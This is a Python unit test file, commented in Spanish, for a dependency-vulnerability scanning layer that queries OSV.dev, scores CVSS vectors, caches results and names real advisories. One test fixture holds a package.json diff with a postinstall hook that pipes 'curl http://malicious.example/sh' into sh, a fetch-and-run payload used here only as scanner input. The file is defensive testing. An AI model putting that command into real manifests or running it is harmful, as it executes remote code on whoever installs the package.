"""Pruebas unitarias para la capa de vulnerabilidades conocidas (CVEs vía
OSV.dev), extraída de deps_layer.py para poder desactivarse por separado de
las señales de ataque a la cadena de suministro (typosquatting, scripts de
instalación sospechosos, instalación directa por URL/Git)."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import httpx

from watchgate.core.layers._shared import DependencyChange
from watchgate.core.layers.base import LAYER_REGISTRY
from watchgate.core.layers.vulnerabilities_layer import (
    OSVCache,
    VulnerabilitiesLayer,
    _cvss3_base_score,
    _describe_vulns,
    _is_high_or_critical_vuln,
    _vuln_severity_label,
)
from watchgate.core.models import CommitAuthor, FileChange, FileStatus, NormalizedDiff


def _make_diff(files: list[FileChange]) -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="0000000000000000000000000000000000000000",
        head_sha="1111111111111111111111111111111111111111",
        repo_path="/tmp/fake_repo",
        files=files,
        commit_messages=["test commit"],
        authors=[CommitAuthor(name="Test User", email="test@example.com")],
    )


def test_vulnerabilities_layer_registered() -> None:
    assert "vulnerabilities" in LAYER_REGISTRY
    assert LAYER_REGISTRY["vulnerabilities"] is VulnerabilitiesLayer


def test_no_manifests_changed() -> None:
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="src/main.py",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1 +1 @@\n-print('hello')\n+print('world')",
                additions=1,
                deletions=1,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score == 0
    assert res.justification == "No se han modificado manifiestos de dependencias."


def test_osv_vulnerability_high() -> None:
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+vulnerable-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )
    osv_response = {
        "vulns": [
            {
                "id": "GHSA-1234-5678",
                "database_specific": {"severity": "HIGH"},
            }
        ]
    }

    with patch.object(layer, "_query_osv_batch", return_value={0: (osv_response, None)}):
        res = layer.analyze(diff, {})

    assert res.risk_score == 90
    # Auditoría: el mensaje antes era "Vulnerabilidad crítica/alta o
    # acumulada en OSV (N vulns)" -- la REGLA interna de puntuación, no una
    # descripción real ("el usuario no lo entendía"). Ahora debe nombrar el
    # aviso real (buscable) y su severidad de verdad.
    assert "GHSA-1234-5678" in res.justification
    assert "ALTA" in res.justification


def test_no_known_vulnerabilities_gives_zero_not_a_baseline() -> None:
    """A diferencia de deps_layer.py (que da un baseline de 10 a cualquier
    dependencia nueva), un escáner de vulnerabilidades puro no debe subir
    el score solo porque la dependencia sea nueva -- 0 si OSV no encuentra
    nada, punto."""
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+clean-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )
    with patch.object(layer, "_query_osv_batch", return_value={0: ({"vulns": []}, None)}):
        res = layer.analyze(diff, {})
    assert res.risk_score == 0


def test_osv_network_error_graceful() -> None:
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+some-new-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )

    with patch("httpx.post", side_effect=httpx.ConnectError("Connection refused")):
        res = layer.analyze(diff, {})

    assert res.risk_score == 0  # fallo de red no eleva el score
    assert "No verificable por fallo de red" in res.justification


def test_osv_sqlite_cache() -> None:
    cache = OSVCache(db_path=":memory:")
    change = DependencyChange(ecosystem="npm", name="express", new_version="4.18.2")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"vulns": []}

    with patch("httpx.post", return_value=mock_resp) as mock_post:
        layer = VulnerabilitiesLayer(cache_db_path=":memory:")
        layer.cache = cache

        res1, err1 = layer._query_osv(change)
        assert err1 is None
        assert res1 == {"vulns": []}
        assert mock_post.call_count == 1

        res2, err2 = layer._query_osv(change)
        assert err2 is None
        assert res2 == {"vulns": []}
        assert mock_post.call_count == 1  # No volvió a llamar a la red


def test_osv_batch_query_and_cache() -> None:
    cache = OSVCache(db_path=":memory:")
    c1 = DependencyChange(ecosystem="PyPI", name="pkg1", new_version="1.0")
    c2 = DependencyChange(ecosystem="PyPI", name="pkg2", new_version="2.0")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "results": [
            {"vulns": []},
            {"vulns": [{"id": "CVE-2026-0001", "database_specific": {"severity": "HIGH"}}]},
        ]
    }

    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    layer.cache = cache

    with patch("httpx.post", return_value=mock_resp) as mock_post:
        res_batch = layer._query_osv_batch([c1, c2])
        assert len(res_batch) == 2
        assert mock_post.call_count == 1
        req_json = mock_post.call_args.kwargs["json"]
        assert len(req_json["queries"]) == 2

        cached_c1 = cache.get("pkg1", "PyPI", "1.0")
        cached_c2 = cache.get("pkg2", "PyPI", "2.0")
        assert cached_c1 == {"vulns": []}
        assert cached_c2 is not None and len(cached_c2["vulns"]) == 1

        res_batch_cached = layer._query_osv_batch([c1, c2])
        assert len(res_batch_cached) == 2
        assert mock_post.call_count == 1


def test_osv_severity_precision_no_false_positives() -> None:
    vuln_low = {
        "id": "GHSA-1111-2222",
        "summary": "Fix released on 2023-09-10 v1.9.0",
        "database_specific": {"severity": "MODERATE"},
        "severity": [{"type": "CVSS_V3", "score": "5.3"}],
    }
    assert _is_high_or_critical_vuln(vuln_low) is False

    vuln_high = {
        "id": "GHSA-3333-4444",
        "database_specific": {"github_reviewed_severity": "HIGH"},
    }
    assert _is_high_or_critical_vuln(vuln_high) is True

    vuln_crit = {
        "id": "GHSA-5555-6666",
        "database_specific": {"cvss": {"score": 9.8}},
    }
    assert _is_high_or_critical_vuln(vuln_crit) is True


def test_dependency_change_without_name_is_skipped() -> None:
    """Un cambio derivado de un script sin dependencias (p. ej. package.json
    con solo un postinstall modificado) no tiene nombre de paquete real que
    consultar en OSV -- deps_layer.py sí lo trata (es señal de ataque), esta
    capa no."""
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    hunk = (
        '@@ -1,3 +1,4 @@\n "scripts": {\n'
        '+  "postinstall": "curl http://malicious.example/sh | sh"\n }'
    )
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk=hunk,
                additions=1,
                deletions=0,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score == 0
    assert "no hay dependencias nuevas" in res.justification.lower()


# --- Auditoría: _is_high_or_critical_vuln leía severity[].score como si
# fuera un número o "HIGH"/"CRITICAL" en texto -- en la API real de OSV ese
# campo es SIEMPRE un vector CVSS ("CVSS:3.1/AV:N/..."), así que ese código
# nunca acertaba fuera de `database_specific`/`ecosystem_specific`
# (ausentes, p. ej., en avisos PyPI/PySec sin origen GitHub). Vectores y
# scores esperados a continuación confirmados contra la API real de OSV.dev
# (lodash 4.17.15, GHSA-35jh-r3h4-6jhm / GHSA-p6mc-m468-83gw).


def test_cvss3_base_score_matches_published_nvd_scores() -> None:
    assert _cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H") == 7.2
    assert _cvss3_base_score("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H") == 7.4
    assert _cvss3_base_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L") == 5.3


def test_cvss3_base_score_none_for_non_v3_or_incomplete_vectors() -> None:
    assert _cvss3_base_score("AV:N/AC:L/Au:N/C:C/I:C/A:C") is None  # CVSS v2, sin prefijo v3
    assert _cvss3_base_score("CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H") is None
    assert _cvss3_base_score("CVSS:3.1/AV:N/AC:L") is None  # métricas obligatorias ausentes
    assert _cvss3_base_score("") is None


def test_is_high_or_critical_vuln_detects_high_from_cvss_vector_alone() -> None:
    """Sin database_specific/ecosystem_specific (avisos no-GitHub), el
    vector CVSS del campo estándar debe ser suficiente por sí solo."""
    vuln = {
        "id": "GHSA-35jh-r3h4-6jhm",
        "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"}],
    }
    assert _is_high_or_critical_vuln(vuln) is True


def test_is_high_or_critical_vuln_false_for_advisory_with_no_severity_data_anywhere() -> None:
    """Caso real encontrado en auditoría: PYSEC-2021-142 (RCE conocido en
    PyYAML) no trae `severity`, `database_specific` ni `ecosystem_specific`
    -- debe degradar a False sin lanzar excepción, no asumir el peor caso
    (eso lo cubre igualmente el umbral de acumulación >= 5 vulns en analyze())."""
    assert _is_high_or_critical_vuln({"id": "PYSEC-2021-142"}) is False


def test_batch_truncation_marks_excess_dependencies_unverified_not_clean() -> None:
    """Auditoría: los paquetes que exceden max_osv_queries puntuaban 0,
    indistinguible de "revisado, sin vulnerabilidades" en el score
    agregado. Ahora deben aparecer como finding de "no verificado", no
    desaparecer silenciosamente."""
    layer = VulnerabilitiesLayer(cache_db_path=":memory:", max_osv_queries=1)
    c1 = DependencyChange(ecosystem="PyPI", name="pkg1", new_version="1.0")
    c2 = DependencyChange(ecosystem="PyPI", name="pkg2", new_version="2.0")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"results": [{"vulns": []}]}

    with patch("httpx.post", return_value=mock_resp):
        batch = layer._query_osv_batch([c1, c2])

    assert batch[0] == ({"vulns": []}, None)
    assert batch[1][0] is None
    assert batch[1][1] is not None and "límite" in batch[1][1]

    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,2 @@\n+pkg1==1.0\n+pkg2==2.0",
                additions=2,
                deletions=0,
            )
        ]
    )
    with patch.object(layer, "_query_osv_batch", return_value=batch):
        res = layer.analyze(diff, {})

    unverified = [f for f in res.findings if f.rule_id == "vulnerability-unverified-pypi"]
    assert len(unverified) == 1
    assert "pkg2" in unverified[0].message


def test_incomplete_batch_response_marks_missing_indices_unverified() -> None:
    """Auditoría: si OSV responde 200 OK pero con menos resultados de los
    pedidos (sin lanzar excepción), el índice sobrante caía en
    `.get(idx, (None, None))` -> se leía como "sin vulnerabilidades"
    en vez de "no verificable"."""
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    c1 = DependencyChange(ecosystem="PyPI", name="pkg1", new_version="1.0")
    c2 = DependencyChange(ecosystem="PyPI", name="pkg2", new_version="2.0")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    # Solo 1 resultado para 2 queries enviadas.
    mock_resp.json.return_value = {"results": [{"vulns": []}]}

    with patch("httpx.post", return_value=mock_resp):
        batch = layer._query_osv_batch([c1, c2])

    assert batch[0] == ({"vulns": []}, None)
    assert 1 not in batch  # el índice sin respuesta no debe fingir estar limpio

    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,2 @@\n+pkg1==1.0\n+pkg2==2.0",
                additions=2,
                deletions=0,
            )
        ]
    )
    with patch.object(layer, "_query_osv_batch", return_value=batch):
        res = layer.analyze(diff, {})

    unverified = [f for f in res.findings if f.rule_id == "vulnerability-unverified-pypi"]
    assert len(unverified) == 1
    assert "pkg2" in unverified[0].message


# --- Auditoría: "el reporte de la capa de vulnerabilidades no se entiende"
# -- el mensaje decía literalmente la REGLA interna de puntuación
# ("Vulnerabilidad crítica/alta o acumulada en OSV (N vulns)") en vez de
# describir la vulnerabilidad real. _describe_vulns/_vuln_severity_label
# nombran el aviso real (id buscable) + resumen + severidad de verdad.


def test_vuln_severity_label_reads_database_specific_severity() -> None:
    assert _vuln_severity_label({"database_specific": {"severity": "CRITICAL"}}) == "CRÍTICA"
    assert _vuln_severity_label({"database_specific": {"severity": "moderate"}}) == "MEDIA"
    assert _vuln_severity_label({"database_specific": {"severity": "LOW"}}) == "BAJA"


def test_vuln_severity_label_falls_back_through_sources_in_order() -> None:
    assert (
        _vuln_severity_label({"database_specific": {"github_reviewed_severity": "HIGH"}}) == "ALTA"
    )
    assert _vuln_severity_label({"ecosystem_specific": {"severity": "high"}}) == "ALTA"


def test_vuln_severity_label_none_when_nothing_usable() -> None:
    """Caso real de auditoría: PYSEC-2021-142 (RCE conocido en PyYAML) no
    trae severidad en ningún campo reconocible."""
    assert _vuln_severity_label({"id": "PYSEC-2021-142"}) is None
    assert _vuln_severity_label({"severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/x"}]}) is None


def test_describe_vulns_names_the_real_advisory_with_severity_and_summary() -> None:
    vulns = [
        {
            "id": "GHSA-35jh-r3h4-6jhm",
            "summary": "Command Injection in lodash",
            "database_specific": {"severity": "HIGH"},
        }
    ]
    result = _describe_vulns(vulns)
    assert result == "GHSA-35jh-r3h4-6jhm (ALTA): Command Injection in lodash"


def test_describe_vulns_prefers_the_highest_severity_advisory_as_headline() -> None:
    vulns = [
        {"id": "GHSA-low", "summary": "minor issue", "database_specific": {"severity": "LOW"}},
        {"id": "GHSA-crit", "summary": "RCE", "database_specific": {"severity": "CRITICAL"}},
    ]
    result = _describe_vulns(vulns)
    assert result.startswith("GHSA-crit (CRÍTICA): RCE")
    assert "1 más conocida en OSV" in result


def test_describe_vulns_truncates_long_summaries() -> None:
    long_summary = "x" * 300
    vulns = [{"id": "GHSA-x", "summary": long_summary, "database_specific": {"severity": "HIGH"}}]
    result = _describe_vulns(vulns)
    assert len(result) < len(long_summary)
    assert result.endswith("…")


def test_describe_vulns_degrades_gracefully_with_no_severity_or_summary_data() -> None:
    """Caso real: un aviso sin severidad reconocible en ningún campo (ver
    PYSEC-2021-142) no debe fingir severidad alta ni reventar."""
    result = _describe_vulns([{"id": "PYSEC-2021-142"}])
    assert result == "PYSEC-2021-142 (severidad no confirmada por OSV)"


def test_full_analyze_justification_names_the_real_advisory() -> None:
    """Prueba de extremo a extremo (analyze() completo, no solo el
    helper): el mensaje que de verdad ve el usuario en el Dashboard debe
    nombrar el CVE/GHSA real, no la regla interna de puntuación."""
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+flask==0.12.2",
                additions=1,
                deletions=0,
            )
        ]
    )
    osv_response = {
        "vulns": [
            {
                "id": "GHSA-35jh-r3h4-6jhm",
                "summary": "Command Injection in lodash",
                "database_specific": {"severity": "HIGH"},
            }
        ]
    }
    with patch.object(layer, "_query_osv_batch", return_value={0: (osv_response, None)}):
        res = layer.analyze(diff, {})

    assert "GHSA-35jh-r3h4-6jhm" in res.justification
    assert "crítica/alta o acumulada" not in res.justification.lower()
    assert len(res.findings) == 1
    assert "GHSA-35jh-r3h4-6jhm" in res.findings[0].message
